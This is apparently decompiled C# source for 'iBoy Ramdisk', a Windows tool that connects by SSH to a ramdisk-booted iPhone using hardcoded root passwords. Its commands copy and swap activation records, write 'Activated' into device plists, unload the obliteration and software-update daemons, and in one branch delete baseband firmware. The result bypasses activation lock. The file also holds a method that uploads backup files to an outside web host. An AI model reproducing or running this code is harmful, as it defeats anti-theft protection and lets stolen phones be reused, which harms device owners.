using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Renci.SshNet;

// Token: 0x02000023 RID: 35
internal class Class20
{
	// Token: 0x06000101 RID: 257 RVA: 0x00010124 File Offset: 0x0000E324
	public void method_0()
	{
		string text = Class19.string_2;
		string text2 = ".\\Backups\\" + text;
		this.method_18(5, "[+] Checking SSH..");
		this.method_13();
		if (Class19.string_11 == "16")
		{
			this.method_3();
		}
		else
		{
			this.method_11();
		}
		try
		{
			if (!File.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			if (!File.Exists(".\\Backups\\" + text + ".zip"))
			{
				Directory.CreateDirectory(Environment.CurrentDirectory + "\\Backups\\" + text + "\\FairPlay\\");
				string text3 = this.method_10("find /mnt2/containers/Data/System -name activation_record.plist");
				string text4 = this.method_10("find /mnt2/containers/Data/System -name data_ark.plist");
				string text5 = this.method_10("find /mnt2/containers/Data/System -name 'internal'").Replace("Library/internal", "").Replace("\n", "")
					.Replace("//", "/");
				this.method_18(30, "[+] Download Activation Records..");
				try
				{
					this.scpClient_0.Download(text5 + "Library/activation_records/activation_record.plist", new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\1"));
					this.scpClient_0.Download("/mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist", new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\3"));
					this.scpClient_0.Download(text5 + "Library/internal/data_ark.plist", new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\2"));
				}
				catch
				{
					this.method_12("chmod -R 777 " + text3);
					this.method_12("chmod -R 777 " + text4);
					this.scpClient_0.Download(text3, new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\1"));
					this.scpClient_0.Download(text4, new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\2"));
					this.scpClient_0.Download("/mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist", new FileInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\3"));
				}
				this.method_8();
				this.method_18(60, "[+] Saving Activations Records..");
				Directory.CreateDirectory(Environment.CurrentDirectory + "\\Backups\\" + text);
				string text6 = Environment.CurrentDirectory + "\\Backups\\" + text;
				string text7 = Environment.CurrentDirectory + "\\Backups\\" + text + ".zip";
				ZipFile.CreateFromDirectory(text6, text7);
				if (Directory.Exists(Environment.CurrentDirectory + "\\Backups\\" + text))
				{
					Directory.Delete(Environment.CurrentDirectory + "\\Backups\\" + text, true);
				}
				this.method_18(80, "[+] Saving backup...");
				Class5 @class = new Class5();
				@class.method_6("\niDevice Backup Successfully..");
				this.method_18(100, "[+] Backup Successfully!! | Device reboot in 5 Seconds");
				DialogResult dialogResult = MessageBox.Show("Your Backup Has Been Successfully saved \n" + text7 + Class19.string_2 + ".zip \nErase device Now ??", "Backup Successfully !!", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
				if (dialogResult != DialogResult.Yes)
				{
					this.method_12("kill 1");
				}
				else
				{
					this.method_12("/usr/sbin/nvram oblit-inprogress=5");
					this.method_12("/sbin/reboot");
					MessageBox.Show("Erase successfully in Next Boot !!", "iBoy Ramdisk", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
			}
			else
			{
				MessageBox.Show("Sorry, Backup Already Exist In Folder ./Backups ;)", "Backup Exist", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				this.method_18(20, "[-] Backup Already Exist..");
			}
		}
		catch (Exception ex)
		{
			if (!ex.Message.ToLowerInvariant().Contains("filename"))
			{
				MessageBox.Show(ex.Message, "iBoy Ramdisk Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			else
			{
				MessageBox.Show("Filename Not Found in your device !! \n Maybe your device in Hello Mode !!!\n Or filesystems not mounted !!", "iBoy Ramdisk Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
	}

	// Token: 0x06000102 RID: 258 RVA: 0x00010504 File Offset: 0x0000E704
	public void method_1()
	{
		try
		{
			this.method_13();
			string text = this.method_10("ls /mnt2");
			if (!(text != ""))
			{
				Console.WriteLine("File Not Mounted");
			}
			else
			{
				Console.WriteLine(text);
				Console.WriteLine("File Mounted");
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000103 RID: 259 RVA: 0x00010564 File Offset: 0x0000E764
	public void method_2()
	{
		try
		{
			this.method_13();
			string text = this.method_10("/usr/bin/sw_vers | grep ProductVersion | sed 's/ProductVersion: //'");
			Console.WriteLine(text);
			if (text == "15")
			{
			}
		}
		catch
		{
		}
	}

	// Token: 0x06000104 RID: 260 RVA: 0x000105AC File Offset: 0x0000E7AC
	public void method_3()
	{
		try
		{
			this.method_18(8, "Mounting Systems");
			this.method_12("/sbin/mount_apfs -R /dev/disk1s1 /mnt1");
			this.method_12("/sbin/mount_apfs -R /dev/disk1s3 /mnt7");
			this.method_18(11, "Mounting Baseband");
			this.method_12("/sbin/mount_apfs -R /dev/disk1s4 /mnt4");
			this.method_12("/sbin/mount_apfs -R /dev/disk1s5 /mnt5");
			this.method_12("/sbin/mount_apfs -R /dev/disk1s6 /mnt6");
			this.method_12("/usr/libexec/seputil --gigalocker-init");
			this.method_12("/usr/sbin/nvram oblit-inprogress=1 rev=2");
			this.method_12("/usr/libexec/seputil --load /mnt6/*/usr/standalone/firmware/sep*");
			this.method_12("/usr/sbin/nvram -d oblit-inprogres && /usr/sbin/nvram -d oblit-inprogres");
			this.method_18(18, "Mounting Data");
			this.method_12("/sbin/mount_apfs /dev/disk1s2 /mnt2");
		}
		catch
		{
		}
	}

	// Token: 0x06000105 RID: 261 RVA: 0x00010670 File Offset: 0x0000E870
	public void method_4()
	{
		try
		{
			this.method_12("/sbin/mount_apfs -R /dev/disk1s1 /mnt1");
			this.method_12("/sbin/mount_apfs -R /dev/disk1s3 /mnt7");
			this.method_12("/sbin/mount_apfs -R /dev/disk1s4 /mnt4");
			this.method_12("/sbin/mount_apfs -R /dev/disk1s5 /mnt5");
			this.method_12("/sbin/mount_apfs -R /dev/disk1s6 /mnt6");
			this.method_12("/usr/libexec/seputil --gigalocker-init");
			this.method_12("/usr/libexec/seputil --load /mnt6/*/usr/standalone/firmware/sep*");
			this.method_12("/sbin/mount_apfs /dev/disk1s2 /mnt2");
		}
		catch
		{
		}
	}

	// Token: 0x06000106 RID: 262 RVA: 0x000106F4 File Offset: 0x0000E8F4
	public bool method_5()
	{
		this.method_13();
		if (Class19.string_11 == "16")
		{
			this.method_4();
		}
		else
		{
			this.method_11();
		}
		string text = Class19.string_2;
		string text2 = ".\\Backups\\";
		string text3 = ".\\Backups\\" + text + ".zip";
		bool isConnected = this.scpClient_0.IsConnected;
		if (!File.Exists(text3))
		{
			Directory.CreateDirectory(text2);
		}
		bool flag;
		try
		{
			if (!this.scpClient_0.IsConnected)
			{
				this.scpClient_0.Connect();
			}
			if (Directory.Exists(Environment.CurrentDirectory + "\\Backups\\" + text))
			{
				Directory.Delete(Environment.CurrentDirectory + "\\Backups\\" + text, true);
			}
			string text4 = Environment.CurrentDirectory + "\\Backups\\" + text + ".zip";
			string text5 = Environment.CurrentDirectory + "\\Backups\\" + text;
			ZipFile.ExtractToDirectory(text4, text5);
			File.Copy(Environment.CurrentDirectory + "\\files\\com.apple.purplebuddy.plist", text5 + "\\com.apple.purplebuddy.plist");
			this.method_18(20, "[+] Checking Backup...");
			string text6 = this.method_10("find /mnt2/containers/Data/System -iname 'internal'").Replace("Library/internal", "").Replace("\n", "")
				.Replace("//", "/");
			this.method_10("rm -rf /mnt2/mobile/Media/Downloads/" + text);
			this.method_10("rm -rf /mnt2/mobile/Media/" + text);
			this.method_18(30, "[+] Uploading Backup Via Scp");
			this.method_10("mkdir /mnt2/mobile/Media/Downloads/" + text);
			this.scpClient_0.Upload(new DirectoryInfo(Environment.CurrentDirectory + "\\Backups\\" + text), "/mnt2/mobile/Media/Downloads/" + text);
			this.method_10("mv -f /mnt2/mobile/Media/Downloads/" + text + " /mnt2/mobile/Media/" + text);
			this.method_10("chown -R mobile:mobile /mnt2/mobile/Media/" + text);
			this.method_18(40, "[+] Preparing Device...");
			this.method_10("chmod -R 755 /mnt2/mobile/Media/" + text);
			this.method_10("chmod 644 /mnt2/mobile/Media/" + text + "/1");
			this.method_10("chmod 644 /mnt2/mobile/Media/" + text + "/2");
			this.method_10("chmod 644 /mnt2/mobile/Media/" + text + "/3");
			Thread.Sleep(2500);
			this.method_10("find /mnt2/containers/Data/System -name activation_record.plist");
			this.method_10("find /mnt2/containers/Data/System -name data_ark.plist");
			this.method_18(50, "[+] IC-Info.sisv...");
			this.method_10("rm -rf /mnt2/mobile/Library/FairPlay");
			this.method_10("mv -f /mnt2/mobile/Media/" + text + "/FairPlay /mnt2/mobile/Library/");
			this.method_10("chmod -R 755 /mnt2/mobile/Library/FairPlay/");
			this.method_10("chown -R mobile:mobile /mnt2/mobile/Library/FairPlay");
			this.method_10("chmod 664 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv");
			this.method_10("chflags nouchg " + text6 + "/Library /internal/data_ark.plist");
			this.method_18(50, "[+] Checking Device...");
			this.method_10(string.Concat(new string[] { "mv -f /mnt2/mobile/Media/", text, "/2 ", text6, "/Library/internal/data_ark.plist" }));
			this.method_10("chmod 755 " + text6 + "/Library/internal/data_ark.plist");
			this.method_10("chflags uchg " + text6 + "/Library/internal/data_ark.plist");
			this.method_10("mkdir " + text6 + "/Library/activation_records");
			this.method_10(string.Concat(new string[] { "mv -f /mnt2/mobile/Media/", text, "/1 ", text6, "/Library/activation_records/activation_record.plist" }));
			this.method_10("chmod 755 " + text6 + "/Library/activation_records/activation_record.plist");
			this.method_10("chmod 777 " + text6 + "/Library/activation_records/activation_record.plist");
			this.method_10("chflags uchg " + text6 + "/Library/activation_records/activation_record.plist");
			this.method_10("chflags nouchg /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_10("mv -f /mnt2/mobile/Media/" + text + "/3 /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_10("chown root:mobile /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_10("chmod 755 /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_10("chflags uchg /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_10("launchctl unload /mnt2/System/Library/LaunchDaemons/com.apple.mobileactivationd.plist");
			this.method_10("launchctl load /mnt2/System/Library/LaunchDaemons/com.apple.mobileactivationd.plist");
			this.method_10("mv -f /mnt2/mobile/Media/" + text + "/com.apple.purplebuddy.plist /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist");
			this.method_10("rm -rf /mnt2/root/Library/Preferences/com.apple.MobileAsset.plist");
			this.method_10("chmod 600 /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist");
			this.method_10("/usr/bin/uicache --all && chflags uchg /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist");
			this.method_10("rm -rf /mnt2/root/Library/Preferences/com.apple.MobileAsset.plist");
			this.method_10("/bin/chmod 600 /mnt2/root/Library/Preferences/com.apple.MobileAsset.plist");
			this.method_10("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.mobile.obliteration.plist");
			this.method_10("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.mobile.obliteration.plist");
			this.method_10("rm -rf /mnt1/System/Library/LaunchDaemons/com.apple.mobile.obliteration.plist");
			this.method_10("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.mobile.softwareupdated.plist");
			this.method_10("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.OTATaskingAgent.plist");
			this.method_10("/bin/launchctl unload -w /mnt1/System/Library/LaunchDaemons/com.apple.OTACrachCopier.plist");
			this.method_10("/bin/launchctl unload /mnt1/System/Library/LaunchDaemons/com.apple.CommCenter.plist");
			this.method_18(70, "[+] Activating...");
			Class5 @class = new Class5();
			@class.method_6("\n✅ Passcode Device Activated Sucessfully!!!");
			if (Directory.Exists(Environment.CurrentDirectory + "\\Backups\\" + text))
			{
				Directory.Delete(Environment.CurrentDirectory + "\\Backups\\" + text, true);
			}
			this.method_18(100, "[+] Success! Device reboot in 5 seconds");
			this.method_12("kill 1");
			MessageBox.Show("Your Device " + Class19.string_1 + " Successfully Activated You Can OTA UPDATE, But Can't Restore!", "SUCCESSFULLY ACTIVATED!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			this.method_7();
			flag = true;
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			flag = false;
		}
		return flag;
	}

	// Token: 0x06000107 RID: 263 RVA: 0x00010CA4 File Offset: 0x0000EEA4
	public bool method_6()
	{
		this.method_13();
		if (!(Class19.string_11 == "16"))
		{
			this.method_11();
		}
		else
		{
			this.method_4();
		}
		string text = "hello_screen";
		bool flag;
		try
		{
			this.method_18(10, "[+] Starting Bypass iOS 15..");
			if (!this.sshClient_0.IsConnected)
			{
				this.sshClient_0.Connect();
			}
			if (!this.scpClient_0.IsConnected)
			{
				this.scpClient_0.Connect();
			}
			this.method_10("find /mnt2/containers/Data/System -name 'internal'").Replace("Library/internal", "").Replace("\n", "")
				.Replace("//", "/");
			this.method_18(20, "[+] Checking Activation Files..");
			string text2 = this.method_10("find /mnt2/containers/Data/System -iname 'internal'").Replace("Library/internal", "").Replace("\n", "")
				.Replace("//", "/");
			this.method_10("rm -rf /mnt2/mobile/Media/Downloads/" + text);
			this.method_10("rm -rf /mnt2/mobile/Media/" + text);
			this.method_18(30, "[+] Uploading Activation Files..");
			this.method_10("mkdir /mnt2/mobile/Media/Downloads/" + text);
			string text3 = File.ReadAllText("ssl/udid.pl");
			if (!File.Exists(Environment.CurrentDirectory + "\\ActivationFiles\\" + text3 + "\\com.apple.purplebuddy.plist"))
			{
				File.Copy(Environment.CurrentDirectory + "\\files\\com.apple.purplebuddy.plist", Environment.CurrentDirectory + "\\ActivationFiles\\" + text3 + "\\com.apple.purplebuddy.plist");
			}
			this.scpClient_0.Upload(new DirectoryInfo(Environment.CurrentDirectory + ".\\ActivationFiles\\" + text3 + "\\"), "/mnt2/mobile/Media/Downloads/hello_screen/");
			this.method_10("mv -f /mnt2/mobile/Media/Downloads/" + text + " /mnt2/mobile/Media/" + text);
			this.method_10("chown -R mobile:mobile /mnt2/mobile/Media/" + text);
			this.method_18(40, "[+] Preparing Device..");
			this.method_10("chmod -R 755 /mnt2/mobile/Media/" + text);
			this.method_10("chmod 644 /mnt2/mobile/Media/" + text + "/activation_record.plist");
			this.method_10("chmod 644 /mnt2/mobile/Media/" + text + "/Wildcard.der");
			Thread.Sleep(4000);
			this.method_18(50, "[+] Creating Info-sisv Files..");
			this.method_10("rm -rf /mnt2/mobile/Library/FairPlay");
			this.method_10("mkdir -p -m 00755 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes");
			this.method_10("mv -f /mnt2/mobile/Media/hello_screen/IC-Info.sisv /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/");
			this.method_10("chmod 00664 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv");
			this.method_10("chown -R mobile:mobile /mnt2/mobile/Library/FairPlay");
			this.method_18(70, "[+] Creating Activation Files...");
			this.method_10("rm -rf " + text2 + "/Library/activation_records");
			this.method_10("mkdir " + text2 + "/Library/activation_records");
			this.method_10("chflags nouchg " + text2 + "/Library/activation_records");
			this.method_10(string.Concat(new string[] { "mv -f /mnt2/mobile/Media/", text, "/activation_record.plist ", text2, "/Library/activation_records/activation_record.plist" }));
			this.method_10("mv -f /mnt2/mobile/Media/" + text + "/com.apple.purplebuddy.plist /mnt2/mobile/Library/Preferences/com.apple.purplebuddy.plist");
			this.method_10("chmod 755 " + text2 + "/Library/activation_records/activation_record.plist");
			this.method_10("chmod 777 " + text2 + "/Library/activation_records/activation_record.plist");
			this.method_18(80, "[+] Injecting Activation Files..");
			this.method_10("chflags uchg " + text2 + "/Library/activation_records/activation_record.plist");
			this.method_10("chflags nouchg /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_10("chflags nouchg " + text2 + "/Library /internal/data_ark.plist");
			this.method_10("plutil -dict -kPostponementTicket /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_10("plutil -kPostponementTicket -ActivationState -string Activated /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_10("plutil -kPostponementTicket -ActivityURL -string https://albert.apple.com/deviceservices/activity /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_10("plutil -kPostponementTicket -PhoneNumberNotificationURL -string https://albert.apple.com/deviceservices/phoneHome /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_10("plutil -kPostponementTicket -ActivationTicket -string '$(cat /mnt2/mobile/Media/" + text + "/Wildcard.der)' /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_10("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - BuildVersion' -string $build $key");
			this.method_10("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - LastActivated' -string $build $key");
			this.method_10("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - ActivationState' -remove $key");
			this.method_10("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - BrickState' -remove $key");
			this.method_10("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - ActivationState' -string Activated $key");
			this.method_10("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); build=$(ls /mnt2/root/Library/Caches/com.apple.coresymbolicationd); plutil -' - BrickState' -0 -false $key");
			this.method_10("key=$(find /mnt2/containers/Data/System -iname 'data_ark.plist'); plutil -binary $key");
			this.method_10("chflags uchg /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			this.method_10("chflags uchg " + text2 + "/Library /internal/data_ark.plist");
			if (Class19.string_7 == "F97SF2AQFFGD")
			{
				this.method_18(90, "[+] Delete baseband Data !!!");
				this.method_12("chflags -R nouchg /mnt6/*/usr/local/standalone/firmware/");
				this.method_12("rm -rf /mnt6/*/usr/local/standalone/firmware/Baseband");
			}
			else
			{
				this.method_10("chmod 644 /mnt2/mobile/Media/" + text + "/com.apple.commcenter.device_specific_nobackup.plist");
				this.method_10("mv -f /mnt2/mobile/Media/" + text + "/com.apple.commcenter.device_specific_nobackup.plist /mnt2/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
			}
			this.method_12("kill 1");
			Class5 @class = new Class5();
			@class.method_6("\nHello Device Successfully Activated !!");
			this.method_18(100, "Your Device Succesfully Activated!");
			this.method_7();
			MessageBox.Show("Your Device " + Class19.string_1 + " Successfully Activated!\n", "iBoy Ramdisk", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			flag = true;
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "iBoy Ramdisk Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			flag = false;
		}
		return flag;
	}

	// Token: 0x06000108 RID: 264 RVA: 0x0000A75C File Offset: 0x0000895C
	public void method_7()
	{
		Process[] processesByName = Process.GetProcessesByName("iproxy");
		for (int i = 0; i < processesByName.Length; i++)
		{
			processesByName[i].Kill();
		}
		if (File.Exists("%USERPROFILE%\\.ssh\\known_hosts"))
		{
			File.Delete("%USERPROFILE%\\.ssh\\known_hosts");
		}
	}

	// Token: 0x06000109 RID: 265 RVA: 0x000111F4 File Offset: 0x0000F3F4
	private void method_8()
	{
		try
		{
			string text = Class19.string_2;
			this.method_12("chmod -R 777 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv");
			this.method_12("chmod -R 777 /mnt2/mobile/Library/FairPlay");
			this.scpClient_0.Download("/mnt2/mobile/Library/FairPlay", new DirectoryInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\FairPlay\\"));
			this.method_12("chmod 755 /mnt2/mobile/Library/FairPlay/");
		}
		catch
		{
			this.method_9();
		}
	}

	// Token: 0x0600010A RID: 266 RVA: 0x00011274 File Offset: 0x0000F474
	private void method_9()
	{
		try
		{
			string text = Class19.string_2;
			this.method_12("chmod 755 /mnt2/mobile/Library/FairPlay");
			this.method_12("chmod -R 777 /mnt2/mobile/Library/FairPlay");
			this.method_12("chmod -R 777 /mnt2/mobile/Library/FairPlay/iTunes_Control/iTunes/IC-Info.sisv");
			this.method_12("chmod +x /mnt2/mobile/Library/FairPlay");
			this.scpClient_0.Download("/mnt2/mobile/Library/FairPlay", new DirectoryInfo(Environment.CurrentDirectory + "\\Backups\\" + text + "\\FairPlay\\"));
			this.method_12("chmod 755 /mnt2/mobile/Library/FairPlay");
		}
		catch
		{
		}
	}

	// Token: 0x0600010B RID: 267 RVA: 0x00011304 File Offset: 0x0000F504
	internal string method_10(string string_13)
	{
		if (!this.sshClient_0.IsConnected)
		{
			try
			{
				this.sshClient_0.Connect();
			}
			catch
			{
				MessageBox.Show("Cannot Connect to the Device! Please Restart the App and Try Again!", "Connection to Device Lost.");
				return "XD";
			}
		}
		SshCommand sshCommand = this.sshClient_0.CreateCommand(string_13);
		string text;
		try
		{
			sshCommand.Execute();
			text = sshCommand.Result;
		}
		catch
		{
			this.sshClient_0.Disconnect();
			text = "XD";
		}
		return text;
	}

	// Token: 0x0600010C RID: 268 RVA: 0x00011398 File Offset: 0x0000F598
	public void method_11()
	{
		this.method_13();
		this.method_12("/sbin/mount_apfs -R /dev/disk0s1s1 /mnt1");
		this.method_12("/sbin/mount_apfs -R /dev/disk0s1s6 /mnt6");
		this.method_12("/sbin/mount_apfs -R /dev/disk0s1s3 /mnt7");
		this.method_12("/sbin/mount_apfs -R /dev/disk0s1s5 /mnt5");
		this.method_12("/usr/libexec/seputil --gigalocker-init");
		this.method_12("/usr/libexec/seputil --load /mnt6/*/usr/standalone/firmware/sep*");
		this.method_12("/sbin/mount_apfs -R /dev/disk0s1s2 /mnt2");
	}

	// Token: 0x0600010D RID: 269 RVA: 0x00011400 File Offset: 0x0000F600
	public SshCommand method_12(string string_13)
	{
		if (!this.sshClient_0.IsConnected)
		{
			this.sshClient_0.ConnectionInfo.Timeout = TimeSpan.FromSeconds(15.0);
			this.sshClient_0.Connect();
		}
		SshCommand sshCommand2;
		try
		{
			SshCommand sshCommand = this.sshClient_0.CreateCommand(string_13);
			sshCommand.CommandTimeout = TimeSpan.FromSeconds(30.0);
			sshCommand.Execute();
			if (Class19.bool_0)
			{
				Console.WriteLine("=================");
				Console.WriteLine("Command Name = {0} " + sshCommand.CommandText);
				Console.WriteLine("Return Value = {0}", sshCommand.ExitStatus);
				Console.WriteLine("Error = {0}", sshCommand.Error);
				Console.WriteLine("Result = {0}", sshCommand.Result);
			}
			sshCommand2 = sshCommand;
		}
		catch
		{
			if (!(string_13 == "ls") && !(string_13 == "uicache --all"))
			{
				if (!Class19.bool_0)
				{
					Thread.Sleep(2000);
				}
				else
				{
					Console.WriteLine("SSH Error caused by: " + string_13);
				}
				this.method_12(string_13);
			}
			sshCommand2 = null;
		}
		return sshCommand2;
	}

	// Token: 0x0600010E RID: 270 RVA: 0x0001152C File Offset: 0x0000F72C
	public void method_13()
	{
		if (Class19.string_11 == "16")
		{
			for (;;)
			{
				using (Process process = new Process())
				{
					process.StartInfo.FileName = Class20.string_1 + "\\files\\iproxy.exe";
					process.StartInfo.Arguments = this.int_0.ToString() + " 86";
					process.StartInfo.UseShellExecute = false;
					process.StartInfo.RedirectStandardOutput = true;
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.StartInfo.CreateNoWindow = true;
					process.Start();
				}
				try
				{
					this.method_15();
					break;
				}
				catch (Exception ex)
				{
					if (MessageBox.Show("SSH Connection Error. Try again.", "SSH Connection Error", MessageBoxButtons.YesNo) != DialogResult.Yes)
					{
						throw new ApplicationException("Error SSH " + ex.Message);
					}
				}
			}
		}
		else
		{
			for (;;)
			{
				using (Process process2 = new Process())
				{
					process2.StartInfo.FileName = Class20.string_1 + "\\files\\iproxy.exe";
					process2.StartInfo.Arguments = this.int_0.ToString() + " 22";
					process2.StartInfo.UseShellExecute = false;
					process2.StartInfo.RedirectStandardOutput = true;
					process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process2.StartInfo.CreateNoWindow = true;
					process2.Start();
				}
				try
				{
					this.method_14();
					break;
				}
				catch (Exception ex2)
				{
					if (MessageBox.Show("SSH Connection Error. Try again.", "SSH Connection Error", MessageBoxButtons.YesNo) != DialogResult.Yes)
					{
						throw new ApplicationException("Error SSH " + ex2.Message);
					}
				}
			}
		}
	}

	// Token: 0x0600010F RID: 271 RVA: 0x00011714 File Offset: 0x0000F914
	public void method_14()
	{
		AuthenticationMethod[] array = new AuthenticationMethod[]
		{
			new PasswordAuthenticationMethod("root", "alpine")
		};
		ConnectionInfo connectionInfo = new ConnectionInfo(this.string_0, this.int_0, "root", array);
		connectionInfo.Timeout = TimeSpan.FromSeconds(20.0);
		this.sshClient_0 = new SshClient(connectionInfo);
		this.scpClient_0 = new ScpClient(connectionInfo);
		if (!this.sshClient_0.IsConnected)
		{
			this.sshClient_0.Connect();
		}
		if (!this.scpClient_0.IsConnected)
		{
			this.scpClient_0.Connect();
		}
	}

	// Token: 0x06000110 RID: 272 RVA: 0x000117B4 File Offset: 0x0000F9B4
	public void method_15()
	{
		AuthenticationMethod[] array = new AuthenticationMethod[]
		{
			new PasswordAuthenticationMethod("root", "TgRam2022")
		};
		ConnectionInfo connectionInfo = new ConnectionInfo(this.string_0, this.int_0, "root", array);
		connectionInfo.Timeout = TimeSpan.FromSeconds(20.0);
		this.sshClient_0 = new SshClient(connectionInfo);
		this.scpClient_0 = new ScpClient(connectionInfo);
		if (!this.sshClient_0.IsConnected)
		{
			this.sshClient_0.Connect();
		}
		if (!this.scpClient_0.IsConnected)
		{
			this.scpClient_0.Connect();
		}
	}

	// Token: 0x06000111 RID: 273 RVA: 0x00011854 File Offset: 0x0000FA54
	public void method_16(string string_13)
	{
		try
		{
			new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = Class20.string_1 + "\\files\\iproxy.exe",
					Arguments = "2222 " + string_13,
					UseShellExecute = false,
					RedirectStandardOutput = true,
					CreateNoWindow = true
				}
			}.Start();
		}
		catch (Win32Exception)
		{
			MessageBox.Show("iProxy Not Found");
		}
	}

	// Token: 0x06000112 RID: 274 RVA: 0x000118D8 File Offset: 0x0000FAD8
	private void method_17()
	{
		try
		{
			string text = Class19.string_2;
			string text2 = Class20.string_2;
			string text3 = Class20.string_4;
			string text4 = "POST";
			WebClient webClient = new WebClient();
			string text5 = this.string_5;
			webClient.Credentials = CredentialCache.DefaultCredentials;
			webClient.UploadFile(text3, text4, text5 + text + text2);
			webClient.Dispose();
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "Error");
		}
	}

	// Token: 0x06000113 RID: 275 RVA: 0x0001195C File Offset: 0x0000FB5C
	public void method_18(int int_3, string string_13 = "")
	{
		Class20.Class21 @class = new Class20.Class21();
		@class.int_0 = int_3;
		@class.frm_iBoy_0 = (FRM_iBoy)Application.OpenForms["FRM_iBoy"];
		@class.frm_iBoy_0.Invoke(new MethodInvoker(@class.method_0));
		if (Class19.bool_0)
		{
			Console.WriteLine(@class.int_0.ToString() + string_13);
		}
		@class.frm_iBoy_0.method_6(string_13);
	}

	// Token: 0x040000AD RID: 173
	private SshClient sshClient_0;

	// Token: 0x040000AE RID: 174
	private ScpClient scpClient_0;

	// Token: 0x040000AF RID: 175
	public string string_0 = "127.0.0.1";

	// Token: 0x040000B0 RID: 176
	public int int_0 = 2222;

	// Token: 0x040000B1 RID: 177
	public static string string_1 = Directory.GetCurrentDirectory();

	// Token: 0x040000B2 RID: 178
	public static string string_2 = ".zip";

	// Token: 0x040000B3 RID: 179
	public static string string_3 = "\\Backups\\";

	// Token: 0x040000B4 RID: 180
	public static string string_4 = "http://hiacedisemarang.com/ramdisk/";

	// Token: 0x040000B5 RID: 181
	private string string_5 = Class20.string_6 + Class20.string_3;

	// Token: 0x040000B6 RID: 182
	public static string string_6 = Directory.GetCurrentDirectory();

	// Token: 0x040000B7 RID: 183
	public static string string_7 = Class20.string_1 + "\\Backups\\";

	// Token: 0x040000B8 RID: 184
	public static string string_8 = Class20.string_1 + "\\files\\utils\\";

	// Token: 0x040000B9 RID: 185
	public static string string_9 = Class20.string_1 + "\\files\\utils.zip";

	// Token: 0x040000BA RID: 186
	private string string_10;

	// Token: 0x040000BB RID: 187
	private int int_1;

	// Token: 0x040000BC RID: 188
	private int int_2;

	// Token: 0x040000BD RID: 189
	private string string_11;

	// Token: 0x040000BE RID: 190
	public static string string_12 = Class20.string_1 + ".\\Cache\\";

	// Token: 0x02000024 RID: 36
	[CompilerGenerated]
	private sealed class Class21
	{
